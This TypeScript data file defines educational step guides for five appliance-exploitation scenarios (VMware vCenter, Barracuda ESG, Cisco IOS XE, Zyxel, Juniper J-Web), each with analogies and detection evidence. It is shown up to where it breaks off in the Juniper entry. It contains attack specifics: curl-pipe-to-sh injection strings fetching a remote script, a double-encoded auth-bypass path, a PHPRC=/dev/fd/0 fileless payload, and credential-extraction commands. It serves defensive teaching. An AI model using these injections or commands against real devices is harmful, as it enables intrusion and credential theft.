import type { RawScenarioStepGuideData } from '../scenario-step-guides';

export const BATCH3_VIRTUALIZATION_APPLIANCES_STEP_GUIDES: Record<string, RawScenarioStepGuideData> = {
  'vmware-vcenter-cve-2023-34048-unc3886': {
    scenarioId: 'vmware-vcenter-cve-2023-34048-unc3886',
    briefing: {
      headline: 'Scenario Briefing: Mandiant UNC3886 VMware vCenter Zero-Day (CVE-2023-34048) & ESXi "VIRTUALPITA" VSOCK Backdoors',
      storyAnalogy:
        'Imagine a master control tower (`VMware vCenter Server`) that holds the master skeleton keys (`vpxuser`) to every apartment building (`ESXi Hypervisor`) in a city. Most companies put security guards (`EDR agents`) inside the individual apartments (`Windows/Linux Guest VMs`), but cannot install a guard inside the concrete foundation of the apartment building itself (`ESXi Hypervisor`). For two years, the espionage group **UNC3886** used a zero-day flaw (`CVE-2023-34048`) in the control tower’s directory phone line (`vmdird` DCERPC) to break into vCenter, unlocked the master key safe (`symkey.dat` + `VPX_HOST`), and planted secret maintenance hatches (**VIRTUALPITA** & **VIRTUALPIE**) in the concrete foundation of every ESXi building—using internal dumbwaiter shafts (`AF_VSOCK` sockets) to move silently into any apartment without ever stepping out onto the street where network cameras (`Firewalls / NDR`) could see them!',
      plainSummary:
        'Synthesizing Mandiant (Google Cloud) threat intelligence on UNC3886, VMware Advisory VMSA-2023-0023, and CISA KEV (October 2023–June 2024), this scenario traces how UNC3886 exploited CVE-2023-34048 (CVSS 9.8 out-of-bounds heap write in `vmdird` DCERPC) as a zero-day for over two years. After achieving `root` RCE on vCenter and wiping `/var/core/core.vmdird.*` crash dumps, the attacker extracts and decrypts `vpxuser` service credentials from the `VCDB` PostgreSQL database using `/etc/vmware-vpx/ssl/symkey.dat`, lowers ESXi VIB acceptance levels, and deploys the `VIRTUALPITA` and `VIRTUALPIE` backdoors communicating over `AF_VSOCK` (VMCI) sockets.',
      diagramTopologySummary:
        'On the diagram: Node ① (UNC3886 Operator) exploits `vmdird` on Node ②/③ (VMware vCenter Server `:2012`), extracts and decrypts `vpxuser` credentials inside Node ④ (`VCDB` + `symkey.dat`), and installs `VIRTUALPITA` on Node ⑤ (ESXi Hypervisor `AF_VSOCK :5466`), monitored by Node ⑥ (vSphere Syslog / SIEM).',
      documentedAdvisory: 'Mandiant UNC3886 Virtualization Espionage · VMware VMSA-2023-0023 · CVE-2023-34048 · MITRE T1190 / T1547',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1190',
        plainTitle: 'Exploiting `vmdird` DCERPC Out-of-Bounds Write on vCenter Server (CVE-2023-34048)',
        storyAnalogy:
          'The attacker sends a malformed DCERPC network request to vCenter’s directory service (`vmdird` on port 2012) to overwrite heap memory and run commands as `root`—and then deletes `/var/core/core.vmdird.*` crash files to cover their tracks.',
        simpleExplanation:
          'UNC3886 sends crafted DCERPC packets over TCP port 2012 to the VMware Directory Service daemon (/usr/lib/vmware-vmdir/sbin/vmdird) on the vCenter Server Appliance (VCSA). Due to an out-of-bounds heap write flaw in vmdird’s DCERPC protocol implementation (CVE-2023-34048), the attacker achieves unauthenticated remote code execution as root (UID 0). As Mandiant documented, because heap memory corruption often causes a worker thread of vmdird to crash before or after spawning the attacker’s shell, UNC3886 immediately runs rm -f /var/core/core.vmdird.* (deleting the core dump files on disk so storage alerts and forensic investigators do not see the exploit payload).',
        howItWorksInPractice:
          'Even if the attacker deletes the /var/core/core.vmdird.* file from disk, /var/log/vmware/vmdird/ and systemd journal logs still record the unexpected vmdird service exit/restart timestamp.',
        diagramAlignment:
          'On the diagram, arrow #1.1→ sends the DCERPC exploit from Node ① to Node ②/③ (vCenter `vmdird`), and ⇠#1.2 grants `root` execution on the VCSA.',
        detectionAndEvidence:
          'Documented by Mandiant & VMware VMSA-2023-0023: `vmdird` service crash/restart within minutes of interactive shell commands on vCenter.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1552.001',
        plainTitle: 'Decrypting ESXi `vpxuser` Passwords Using `VPX_HOST` & `/etc/vmware-vpx/ssl/symkey.dat`',
        storyAnalogy:
          'vCenter stores the root-level `vpxuser` password for every ESXi hypervisor inside its local PostgreSQL database (`VPX_HOST`), and keeps the AES decryption key (`symkey.dat`) right next to it on the same server!',
        simpleExplanation:
          'To manage all ESXi hypervisors in the cluster, vCenter automatically creates and maintains a privileged root-equivalent account named vpxuser on every ESXi host. With root access on vCenter, UNC3886 queries the local vPostgreSQL database (psql -U postgres -d VCDB -c "SELECT ip_address, user_name, password FROM VPX_HOST;") and reads /etc/vmware-vpx/ssl/symkey.dat (the local plaintext AES symmetric key file that vCenter uses to encrypt database passwords — allowing the attacker to instantly decrypt the vpxuser password for every ESXi hypervisor in the datacenter).',
        howItWorksInPractice:
          'Compromising a single vCenter Server hands the attacker root-equivalent credentials (vpxuser) to every underlying ESXi hypervisor managed by that vCenter instance.',
        diagramAlignment:
          'On the diagram, arrow #2.1→ queries `VPX_HOST` and reads `symkey.dat` inside Node ④, and ⇠#2.2 yields the plaintext `vpxuser` passwords.',
        detectionAndEvidence:
          'Documented by Mandiant: Auditd / shell history showing reads of `/etc/vmware-vpx/ssl/symkey.dat` and `vpxuser` SSH logins on ESXi hosts.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1547',
        plainTitle: 'Installing `VIRTUALPITA` on ESXi & Pivoting via `AF_VSOCK` Hypervisor Sockets',
        storyAnalogy:
          'Instead of opening a normal TCP port on the ESXi host that a firewall would spot, **VIRTUALPITA** listens on `AF_VSOCK`—a virtual internal cable wired directly between the ESXi hypervisor and its guest VMs.',
        simpleExplanation:
          'Using the decrypted vpxuser credentials, UNC3886 logs into the ESXi hypervisor, lowers its package signature requirement (esxcli software acceptance set --level=CommunitySupported), and installs an unsigned vSphere Installation Bundle (.vib) containing VIRTUALPITA (an ELF64 C backdoor disguised as /usr/libexec/setsyslog or vmsyslogd) and VIRTUALPIE. Crucially, VIRTUALPITA binds to socket family AF_VSOCK (VMware’s Virtual Machine Communication Interface, CID 2 — a direct memory-to-memory communication channel between the ESXi hypervisor and its guest Virtual Machines that never touches the physical network card or TCP/IP stack, making the C2 channel completely invisible to network firewalls and NDR sensors).',
        howItWorksInPractice:
          'By chaining AF_VSOCK with CVE-2023-20867 (a VMware Tools authentication bypass in vmtoolsd), UNC3886 can push commands and transfer files from the ESXi hypervisor straight into any guest Virtual Machine without a single network packet.',
        diagramAlignment:
          'On the diagram, arrow #3.1→ installs `VIRTUALPITA` on Node ⑤ (ESXi Hypervisor `AF_VSOCK :5466`) while Node ⑥ (SIEM) flags the `CommunitySupported` VIB install.',
        detectionAndEvidence:
          'Documented by Mandiant: ESXi `syslog.log` showing `AcceptanceLevel` lowered to `CommunitySupported`, unsigned VIB installs, and `lsof -A` listing `AF_VSOCK` listeners.',
      },
    ],
  },

  'barracuda-esg-cve-2023-2868-unc4841': {
    scenarioId: 'barracuda-esg-cve-2023-2868-unc4841',
    briefing: {
      headline: 'Scenario Briefing: Mandiant UNC4841 Barracuda ESG Zero-Day (CVE-2023-2868) — .tar Injection, SALTWATER & Hardware Replacement',
      storyAnalogy:
        'Imagine a corporate mail-screening machine (`Barracuda Email Security Gateway`) that opens every incoming `.tar` package before the recipient even sees the email, and writes down the name of each file inside on a Perl clipboard (`qx/file \'$filename\'/`). The espionage group **UNC4841** mailed a `.tar` package where the file’s name itself was written as `\'|sh -c "curl ..."`! The moment the screening machine read the label out loud, it executed the shell command as `root`. Once inside, UNC4841 welded a secret wiretap into the mail room’s main door (**SALTWATER** in `bsmtp`), hid a silent radio listener on the network cable (**SEASPY** using `libpcap`), and booby-trapped the building’s SQLite database (**SUBMARINE**) so deeply that Barracuda and CISA told every victim: "Throw the entire appliance in the trash and get a brand-new one!"',
      plainSummary:
        'Synthesizing Mandiant’s UNC4841 investigation, CISA Malware Analysis Reports (MAR-10454006), and Barracuda security advisories (May–August 2023), CVE-2023-2868 (CVSS 9.8) is a zero-click unauthenticated command injection flaw in Barracuda Email Security Gateway (ESG) appliances (v5.1.3–9.2.0). Sending an inbound SMTP email with a crafted `.tar` attachment whose member filename starts with `\'|` triggers root command execution inside the Perl attachment scanner, deploying the `SALTWATER` (`/usr/sbin/bsmtp`), `SEASPY` (`libpcap` passive backdoor), and `SUBMARINE` (SQLite trigger) implants.',
      diagramTopologySummary:
        'On the diagram: Node ① (UNC4841 SMTP Sender) emails the malicious `.tar` attachment to Node ②/③ (Barracuda ESG `:25` Perl Scanner), implants `SALTWATER` and `SEASPY` inside Node ④ (`/usr/sbin/bsmtp` & `BarracudaMailService`), and persists via `SUBMARINE` on Node ⑤ to exfiltrate `/mail/` spools, detected by Node ⑥ (CISA YARA / NDR SIEM).',
      documentedAdvisory: 'Mandiant UNC4841 Report · CISA MAR-10454006 (SALTWATER / SEASPY / SUBMARINE) · CVE-2023-2868 · MITRE T1190',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1190',
        plainTitle: 'Zero-Click SMTP `.tar` Filename Command Injection in Perl (CVE-2023-2868)',
        storyAnalogy:
          'Without any human user ever receiving or clicking the email, Barracuda’s automated attachment scanner unpacks the `.tar` file and passes its member filename (`\'|sh -c ...#`) straight into a root Perl shell call.',
        simpleExplanation:
          'UNC4841 sends an external MIME email over SMTP port 25 containing a specially formatted .tar archive attachment. Before the email ever reaches a user’s inbox, the Barracuda ESG appliance automatically inspects the attachment using a Perl script that extracts the .tar member filenames and passes them into a shell command without escaping single quotes or pipe characters (CVE-2023-2868 — where naming a file inside the tar archive `\'|sh -c "curl ...|sh"#` closes the quoted string, pipes into `/bin/sh`, and comments out the rest of the command, giving the attacker instant zero-click root code execution).',
        howItWorksInPractice:
          'Because the vulnerability triggers inside the perimeter email security scanner itself before delivery, even emails addressed to non-existent or bounced recipients could trigger the exploit on unpatched appliances.',
        diagramAlignment:
          'On the diagram, arrow #1.1→ delivers the SMTP `.tar` email from Node ① to Node ②/③ (Barracuda ESG `:25`), and ⇠#1.2 executes the injected Perl `qx()` shell command as `root`.',
        detectionAndEvidence:
          'Documented by Mandiant, CISA & Suricata SID 2045992: Inbound SMTP `.tar` attachments containing `\'|` (`0x27 0x7c`) in the tar member header.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1505.003',
        plainTitle: 'Deploying "SALTWATER" (`/usr/sbin/bsmtp`) & "SEASPY" (`libpcap` Passive Backdoor)',
        storyAnalogy:
          'To maintain invisible access, UNC4841 trojanizes the appliance’s real mail daemon (**SALTWATER** in `/usr/sbin/bsmtp`) and runs **SEASPY** (`BarracudaMailService`), which quietly sniffs `eth0` with `libpcap` for a magic knock packet without opening any new network port.',
        simpleExplanation:
          'With root access on the appliance, UNC4841 installs two stealthy backdoors analyzed by Mandiant and CISA: (1) SALTWATER (a trojanized replacement for the legitimate Barracuda SMTP daemon /usr/sbin/bsmtp that embeds six RC4-encrypted modules to execute commands, proxy traffic, and intercept emails inside the normal mail process); and (2) SEASPY (a passive C++ backdoor disguised as /usr/sbin/BarracudaMailService that uses the libpcap packet-capture library on interface eth0 to watch all normal TCP port 25 and 587 traffic for a secret magic knock sequence — meaning netstat shows zero extra listening ports on the appliance).',
        howItWorksInPractice:
          'Why use a libpcap sniffer (SEASPY) for persistence? Because even if a firewall blocks all ports except SMTP port 25, SEASPY inspects raw Ethernet frames arriving on port 25 before they reach the mail server and wakes up a reverse shell only when the attacker’s magic packet arrives.',
        diagramAlignment:
          'On the diagram, arrow #2.1→ implants `SALTWATER` and `SEASPY` inside Node ④ (`bsmtp` & `BarracudaMailService`), and ⇠#2.2 activates the passive `eth0` PCAP listener.',
        detectionAndEvidence:
          'Documented in CISA MAR-10454006: YARA detection on modified `/usr/sbin/bsmtp` (`SALTWATER`) and `/usr/sbin/BarracudaMailService` (`SEASPY`).',
      },
      {
        stepNumber: 3,
        mitreId: 'T1114.002',
        plainTitle: 'Surviving Patches with "SUBMARINE" SQLite Triggers & Exfiltrating Corporate Mail Spools',
        storyAnalogy:
          'When Barracuda deployed emergency patch scripts, UNC4841 hid **SUBMARINE** inside a SQLite database trigger (`/mail/config/config.db` -> `/etc/init.d/ee`) so the malware resurrected itself every time the database was read—forcing victims to physically replace the appliance!',
        simpleExplanation:
          'When defenders and Barracuda deployed remediation patches in May 2023, UNC4841 rapidly adapted by deploying SUBMARINE (a deep-persistence rootkit that plants a malicious SQL TRIGGER inside the appliance’s core SQLite configuration database along with /etc/init.d/ee, so that whenever the appliance reads its database after a reboot or firmware update, SQLite automatically executes the attacker’s shell script as root) and exfiltrated compressed .tar.gz archives of targeted government and diplomatic mailboxes.',
        howItWorksInPractice:
          'Because UNC4841 compromised multiple layers of the appliance (SQLite triggers, kernel modules, and device SSL certificates), both Barracuda Networks and CISA issued the rare directive that all compromised ESG appliances must be completely decommissioned and replaced regardless of patch level.',
        diagramAlignment:
          'On the diagram, arrow #3.1→ triggers `SUBMARINE` and exfiltrates `/mail/` spools from Node ⑤ while Node ⑥ (SIEM / NDR) detects the unexpected outbound TLS data transfer from the ESG.',
        detectionAndEvidence:
          'Documented by Mandiant & CISA: Malicious SQLite triggers in `/mail/config/`, `/etc/init.d/ee`, and large outbound HTTPS transfers initiated by the Barracuda ESG IP.',
      },
    ],
  },

  'cisco-ios-xe-cve-2023-20198-badimplant': {
    scenarioId: 'cisco-ios-xe-cve-2023-20198-badimplant',
    briefing: {
      headline: 'Scenario Briefing: Cisco IOS XE Zero-Day Chain (CVE-2023-20198 & CVE-2023-20273) — Double URL-Encoding to "BadCandy" Lua Implant',
      storyAnalogy:
        'Imagine a building where the front-door guard (`NGINX Reverse Proxy`) has strict orders: "Block any stranger who asks to visit room `/webui_wsma_http`!" However, the attacker writes the room name on their visitor slip using a double-layered cipher (`/%2577ebui_wsma_http`, where `%2577` is `%77` encoded twice). The front-door guard decodes the first layer (`/%77ebui_wsma_http`), says "Well, that doesn’t spell `/webui_wsma_http`!", and waves the slip through to the back-office clerk (`WSMA Backend`). The back-office clerk decodes the second layer (`%77` -> `w`), sees `/webui_wsma_http`, and dutifully creates a master `privilege 15` administrator account (`CVE-2023-20198`)! Next, using that new account, the attacker exploits a second bug (`CVE-2023-20273`) to break out into the router’s underlying Linux room, plants the **BadCandy** Lua spy script inside NGINX’s memory, and erases the temporary admin account so the router’s configuration looks 100% clean!',
      plainSummary:
        'Discovered and analyzed by Cisco Talos, VulnCheck, and CISA (October 2023), this two-zero-day chain compromised over 40,000 internet-facing Cisco IOS XE routers and switches with the Web UI enabled. First, requesting `/%2577ebui_wsma_http` (CVE-2023-20198, CVSS 10.0) bypasses NGINX authentication checks to reach the internal WSMA SOAP handler and create a local `privilege 15` administrator account. Second, authenticating with that account to `/webui/rest/softwareMgmt/installAdd` (CVE-2023-20273) injects commands as Linux `root` to implant the `BadCandy` Lua webshell (`/usr/binos/conf/nginx-conf/occo.conf` -> `oregon_http.lua`) inside NGINX.',
      diagramTopologySummary:
        'On the diagram: Node ① (Threat Actor) sends `POST /%2577ebui_wsma_http` to Node ②/③ (Cisco IOS XE Router `:443`), chains `CVE-2023-20273` inside Node ④ (`WSMA` + `installAdd` Root RCE), and loads Node ⑤ (`BadCandy` Lua Implant in NGINX), detected via `%SYS-5-CONFIG_I` syslog and Suricata on Node ⑥ (SIEM).',
      documentedAdvisory: 'Cisco Talos Threat Advisory · VulnCheck BadCandy Analysis · CISA KEV CVE-2023-20198 & CVE-2023-20273 · MITRE T1190',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1190',
        plainTitle: 'Bypassing NGINX Auth with `/%2577ebui_wsma_http` to Create a Privilege 15 User (CVE-2023-20198)',
        storyAnalogy:
          'Doubly encoding the letter `w` as `%2577` tricks the outer NGINX proxy into letting the request past its `/webui_wsma_http` block rule, while the inner WSMA server decodes `%77` back to `w` and runs the attacker’s SOAP CLI command.',
        simpleExplanation:
          'On Cisco IOS XE switches and routers with the HTTP/HTTPS Web UI enabled (ip http server / ip http secure-server), an NGINX reverse proxy sits in front of the internal Web Services Management Agent (WSMA). NGINX is configured to require authentication for the path /webui_wsma_http. However, by doubly URL-encoding the letter "w" as %2577—requesting POST /%2577ebui_wsma_http—NGINX decodes the URI once to /%77ebui_wsma_http (which does not match the string "/webui_wsma_http", so NGINX skips the authentication check) and proxies the request to the backend WSMA service, which decodes %77 a second time back to "w" and executes the XML SOAP payload (username cisco_support privilege 15 secret ... — CVE-2023-20198).',
        howItWorksInPractice:
          'Whenever WSMA executes a CLI configuration command over HTTP, Cisco IOS XE writes a telltale syslog entry: `%SYS-5-CONFIG_I: Configured from http by console`.',
        diagramAlignment:
          'On the diagram, arrow #1.1→ sends `POST /%2577ebui_wsma_http` from Node ① to Node ②/③ (Cisco IOS XE Router), and ⇠#1.2 creates the `privilege 15` account.',
        detectionAndEvidence:
          'Documented by Cisco Talos & Suricata SID 2048554: HTTP URI containing `/%2577ebui_wsma` and IOS syslog `%SYS-5-CONFIG_I: Configured from http by console`.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1068',
        plainTitle: 'Chaining `/webui/rest/softwareMgmt/installAdd` to Escape into Linux Root (CVE-2023-20273)',
        storyAnalogy:
          'Having `privilege 15` lets you configure router ports in IOS CLI, but doesn’t give you direct access to the underlying Linux filesystem. So the attacker uses their new `cisco_support` login to trigger a command injection bug in `installAdd` (`CVE-2023-20273`) and become Linux `root`!',
        simpleExplanation:
          'Cisco IOS XE runs as a daemon (IOSd) on top of an underlying Linux operating system (BinOS). While CVE-2023-20198 gives the attacker an IOS CLI "privilege 15" administrator account, planting a stealthy web backdoor requires Linux root access. Authenticating with the newly created cisco_support account, the attacker sends a crafted JSON POST request to /webui/rest/softwareMgmt/installAdd (CVE-2023-20273 — an authenticated OS command injection flaw in the Web UI software installation handler that passes unsanitized parameters to a Linux root shell).',
        howItWorksInPractice:
          'When CVE-2023-20273 triggers, the router logs `%WEBUI-6-INSTALL_OPERATION_INFO: User: username, Install Operation: ADD` right as the attacker’s Linux root commands execute.',
        diagramAlignment:
          'On the diagram, arrow #2.1→ exploits `/webui/rest/softwareMgmt/installAdd` inside Node ④, and ⇠#2.2 spawns a Linux `root` shell on BinOS.',
        detectionAndEvidence:
          'Documented by Cisco Talos: Syslog `%WEBUI-6-INSTALL_OPERATION_INFO` immediately following `%SYS-5-CONFIG_I: Configured from http`.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1505.003',
        plainTitle: 'Implanting the "BadCandy" Lua Webshell in NGINX & Deleting the Rogue User',
        storyAnalogy:
          'As Linux `root`, the attacker writes `occo.conf` and `oregon_http.lua` (**BadCandy**), reloads NGINX so the Lua backdoor lives in RAM, and then deletes the `cisco_support` user from `running-config` so admins inspecting the router config see nothing wrong!',
        simpleExplanation:
          'With Linux root privileges, the attacker writes the BadCandy Lua webshell to /var/scrollable/view/oregon_http.lua, adds an NGINX configuration hook at /usr/binos/conf/nginx-conf/occo.conf (which maps the URL /webui/logoutconfirm.html?logon_hash=1 to execute oregon_http.lua), and sends a SIGHUP signal to nginx so it reloads the Lua script into memory. As VulnCheck documented, the attacker then deletes the temporary cisco_support account from the IOS running-config (so an administrator running show running-config sees no unauthorized users, while the BadCandy Lua backdoor remains active inside NGINX’s memory and allows full root + IOS CLI execution at any time).',
        howItWorksInPractice:
          'Because BadCandy resides in volatile filesystem paths (/usr/binos/conf/nginx-conf/occo.conf) that are wiped on a full device reload, rebooting the router clears the implant—provided the admin also disables the Web UI or installs Cisco’s patch so the attacker cannot immediately re-exploit it.',
        diagramAlignment:
          'On the diagram, arrow #3.1→ loads `BadCandy` (`oregon_http.lua`) into Node ⑤ (NGINX Worker) while Node ⑥ (SIEM) detects the `/webui/logoutconfirm.html?logon_hash=1` beacon.',
        detectionAndEvidence:
          'Documented by Cisco Talos & VulnCheck: Presence of `/usr/binos/conf/nginx-conf/occo.conf` and POST requests to `/webui/logoutconfirm.html?logon_hash=1`.',
      },
    ],
  },

  'zyxel-firewall-cve-2023-28771-ike-rce': {
    scenarioId: 'zyxel-firewall-cve-2023-28771-ike-rce',
    briefing: {
      headline: 'Scenario Briefing: Zyxel Firewall Pre-Auth IKEv2 RCE (CVE-2023-28771) — 1 UDP Packet to Root Shell via Debug Log Injection',
      storyAnalogy:
        'Imagine a castle gatekeeper (`Zyxel ssod IKEv2 VPN Daemon` on UDP port 500) who receives an error note (`Notify Payload Type 14`) from a stranger outside the moat. The first 48 letters of the note are locked with a secret cipher (`3DES-CBC`), but the gatekeeper’s cipher key is printed right inside the public instruction manual! Even worse, once the gatekeeper unlocks those first 48 letters, they don’t even check if the rest of the note was locked—and to record the error in their diary (`/tmp/sdwan_vpndebug.log`), they shout to a `root` servant (`system()`): `echo "<Stranger’s Note>" >> /tmp/sdwan_vpndebug.log`! By writing `"; curl http://.../z.sh | sh ; echo "` at the end of the UDP packet, the stranger takes over the entire firewall with a **single UDP packet**!',
      plainSummary:
        'Discovered by TRAPA Security and analyzed by Rapid7 and CISA KEV (April–May 2023), CVE-2023-28771 (CVSS 9.8) is an unauthenticated remote OS command injection flaw in the IKEv2 VPN daemon (`/usr/sbin/ssod`) of Zyxel ATP, USG FLEX, VPN, and ZyWALL firewalls. When an attacker sends a single UDP packet to port 500 containing an `IKE_SA_INIT` `Notify` payload (type 14), `libike.so` decrypts the first 48 bytes using a hardcoded 3DES key and passes the unescaped payload string directly into `system("echo ... >> /tmp/sdwan_vpndebug.log")` as `root`.',
      diagramTopologySummary:
        'On the diagram: Node ① (Remote Attacker) sends 1 UDP/500 `IKE_SA_INIT` packet to Node ②/③ (Zyxel Firewall `ssod`), triggers `system("echo ... >> /tmp/sdwan_vpndebug.log")` command injection inside Node ④ (`libike.so`), and executes a root stage-2 payload on Node ⑤, detected via Suricata UDP/500 inspection on Node ⑥ (WAN NDR / SIEM).',
      documentedAdvisory: 'TRAPA Security CVE-2023-28771 Advisory · Rapid7 AttackerKB Analysis · CISA KEV · MITRE ATT&CK T1190 / T1059.004',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1190',
        plainTitle: 'Encrypting a 48-Byte IKEv2 `Notify` Header with Zyxel’s Hardcoded 3DES Key (CVE-2023-28771)',
        storyAnalogy:
          'To reach the vulnerable logging function in `libike.so`, the attacker sends a UDP/500 `IKE_SA_INIT` packet with a `Notify` payload (`Type 14`) whose first 48 bytes are encrypted with the static 3DES key extracted from Zyxel’s firmware.',
        simpleExplanation:
          'As reverse-engineered by TRAPA Security and Rapid7, Zyxel’s VPN key-exchange daemon (/usr/sbin/ssod linked with /lib/libike.so) listens on UDP port 500. When an unauthenticated internet client sends an IKEv2 IKE_SA_INIT packet (Exchange Type 34) containing a Notify payload with Message Type 14 (NO_PROPOSAL_CHOSEN), the function ikev2_fb_Extract_N_Payload() decrypts the first 48 bytes of the notification data using 3DES-CBC with a hardcoded 24-byte key and 8-byte IV baked directly into the firmware binary (meaning any attacker who extracts that key from a public firmware download can craft a valid 48-byte header).',
        howItWorksInPractice:
          'Even more remarkably, libike.so only decrypts the first 48 bytes of the Notify payload and leaves all bytes after offset 48 completely unencrypted in plaintext!',
        diagramAlignment:
          'On the diagram, arrow #1.1→ sends the single UDP/500 `IKE_SA_INIT` packet from Node ① to Node ②/③ (Zyxel Firewall `ssod`), and ⇠#1.2 passes the 48-byte 3DES header check.',
        detectionAndEvidence:
          'Documented by Rapid7 & Suricata SID 2045893: Inbound UDP/500 IKEv2 Notify Type 14 (`|00 00 00 0e|`) packets exceeding 48 bytes with shell semicolons.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1059.004',
        plainTitle: 'Injecting `;cmd;` into `system("echo ... >> /tmp/sdwan_vpndebug.log")` as Root',
        storyAnalogy:
          'Instead of using C’s `fopen()` and `fwrite()` to write a debug log line, the developer called `system("echo <packet_data> >> /tmp/sdwan_vpndebug.log")` as `root`!',
        simpleExplanation:
          'To record the SD-WAN VPN debug message, ssod passes the extracted notification string into cmd_string_unescape() and then formats a shell command using snprintf: "echo %s >> /tmp/sdwan_vpndebug.log" (passing that string straight into C’s system() function running as uid=0 root — CVE-2023-28771). By placing `\"; curl http://198.51.100.233/z.sh | sh ; echo \"` right after the 48-byte 3DES block in the UDP packet, the attacker closes the echo quote, executes their arbitrary shell command as root, and re-opens the quote cleanly.',
        howItWorksInPractice:
          'Why is calling system("echo ...") to write a log file a textbook C anti-pattern? Because invoking `/bin/sh -c` on network-supplied strings allows shell metacharacters (`;`, `|`, `` ` ``, `$()`) to execute arbitrary operating-system commands.',
        diagramAlignment:
          'On the diagram, arrow #2.1→ triggers `system("echo ... >> /tmp/sdwan_vpndebug.log")` inside Node ④ (`ssod`), and ⇠#2.2 spawns `/bin/sh` as `root`.',
        detectionAndEvidence:
          'Documented by TRAPA Security & Rapid7: `/tmp/sdwan_vpndebug.log` containing command output or `ssod` spawning `/bin/sh` and `curl`/`wget`.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1583.005',
        plainTitle: 'Single-Packet Root Compromise of the Perimeter Firewall',
        storyAnalogy:
          'Because UDP is connectionless, a single 188-byte UDP packet to port 500 is enough to force the firewall to download and run a root backdoor from the internet.',
        simpleExplanation:
          'Because CVE-2023-28771 triggers on the very first UDP/500 packet of an IKEv2 exchange (requiring zero authentication or multi-step handshake before reaching the vulnerable logging function), the attacker’s single packet forces the Zyxel firewall to reach out via curl/wget, download a stage-2 ELF binary into /tmp/, and execute it with full root privileges over the perimeter gateway.',
        howItWorksInPractice:
          'Because UDP source IP addresses can be spoofed when no handshake is required, attackers could even trigger blind command execution across wide IP ranges in seconds.',
        diagramAlignment:
          'On the diagram, arrow #3.1→ downloads and executes the root payload on Node ⑤ while Node ⑥ (WAN NDR / SIEM) alerts on the UDP/500 exploit and outbound `.sh` fetch.',
        detectionAndEvidence:
          'Documented in CISA KEV & Shadowserver: Zyxel firewalls initiating outbound HTTP requests to fetch `.sh` and MIPS64 ELF binaries immediately after receiving UDP/500 Notify Type 14 packets.',
      },
    ],
  },

  'juniper-junos-jweb-cve-2023-36845-chain': {
    scenarioId: 'juniper-junos-jweb-cve-2023-36845-chain',
    briefing: {
      headline: 'Scenario Briefing: Juniper Junos OS J-Web Pre-Auth RCE (CVE-2023-36845) — Fileless Execution via `PHPRC=/dev/fd/0`',
      storyAnalogy:
        'Imagine a chef (`FreeBSD php-cgi`) who starts work every morning by reading a rulebook (`php.ini`) from a shelf whose location is written on a sticky note (`PHPRC` environment variable). In Juniper’s J-Web kitchen (`Appweb`), any visitor walking up to `/webauth_operation.php` is accidentally allowed to rewrite that sticky note (`?PHPRC=...`, CVE-2023-36845)! At first, researchers thought you had to smuggle a fake rulebook onto a shelf inside the kitchen first (`CVE-2023-36846`). Then VulnCheck realized something brilliant: what if you write `PHPRC=/dev/fd/0` on the sticky note—telling the chef that the rulebook is the **visitor’s own order slip** (`Standard Input / HTTP POST Body`)? The chef reads the visitor’s POST body as `php.ini`, sees the rule `auto_prepend_file="data://text/plain;base64,..."`, and runs the visitor’s PHP code in memory without touching a single file on disk!',
      plainSummary:
        'Synthesizing watchTowr Labs’ initial J-Web exploit chain, VulnCheck’s single-request fileless refinement, and Juniper SIRT Advisory JSA72300 / CISA KEV (August 2023), CVE-2023-36845 allows an unauthenticated attacker to manipulate the `PHPRC` environment variable on Juniper SRX firewalls and EX switches. By sending `POST /webauth_operation.php?PHPRC=/dev/fd/0` with an HTTP request body containing `allow_url_include=1` and `auto_prepend_file="data://text/plain;base64,..."`, the FreeBSD `php-cgi` process parses the HTTP POST body (`stdin` / `/dev/fd/0`) as `php.ini` and executes arbitrary PHP and shell commands completely filelessly.',
      diagramTopologySummary:
        'On the diagram: Node ① (Remote Attacker) sends `POST /webauth_operation.php?PHPRC=/dev/fd/0` to Node ②/③ (Juniper SRX / EX J-Web `:443`), tricks Node ④ (`php-cgi` `/dev/fd/0` Loader) into parsing the POST body as `php.ini`, and executes `data://` PHP commands on Node ⑤ (`/config/juniper.conf.gz` Exfil), detected via `/var/log/httpd.log` on Node ⑥ (SIEM).',
      documentedAdvisory: 'Juniper SIRT JSA72300 · watchTowr Labs & VulnCheck CVE-2023-36845 Analysis · CISA KEV · MITRE T1190 / T1574.007',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1190',
        plainTitle: 'Setting `PHPRC=/dev/fd/0` on `/webauth_operation.php` Without Authentication (CVE-2023-36845)',
        storyAnalogy:
          'Because Juniper’s Appweb server turns URL query parameters into OS environment variables before launching `php-cgi`, adding `?PHPRC=/dev/fd/0` points PHP’s configuration reader directly at the incoming HTTP POST body (`stdin`).',
        simpleExplanation:
          'On Juniper SRX firewalls and EX switches running J-Web, the Appweb HTTP server spawns /usr/local/bin/php-cgi to process PHP pages like /webauth_operation.php (which is reachable without logging in). Due to CVE-2023-36845, Appweb populates the child process’s environment variables from the HTTP request’s parameters. By sending POST /webauth_operation.php?PHPRC=/dev/fd/0, the attacker sets the PHPRC environment variable (which tells PHP where to load its php.ini configuration file on startup) to /dev/fd/0 (file descriptor 0 on FreeBSD — Standard Input, which in CGI mode contains the raw body of the attacker’s HTTP POST request!).',
        howItWorksInPractice:
          'Compare the two multi-source approaches: watchTowr Labs first demonstrated a 2-step chain (uploading a file via CVE-2023-36846 and pointing PHPRC to that uploaded file), whereas VulnCheck showed that pointing PHPRC to `/dev/fd/0` eliminates the file upload entirely and works in a single fileless HTTP POST request.',
        diagramAlignment:
          'On the diagram, arrow #1.1→ sends `POST /webauth_operation.php?PHPRC=/dev/fd/0` from Node ① to Node ②/③ (Juniper J-Web Server), and ⇠#1.2 spawns `php-cgi` with `PHPRC=/dev/fd/0`.',
        detectionAndEvidence:
          'Documented by watchTowr, VulnCheck & Suricata SID 2047892: HTTP POST requests containing `PHPRC=` in `/var/log/httpd.log`.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1574.007',
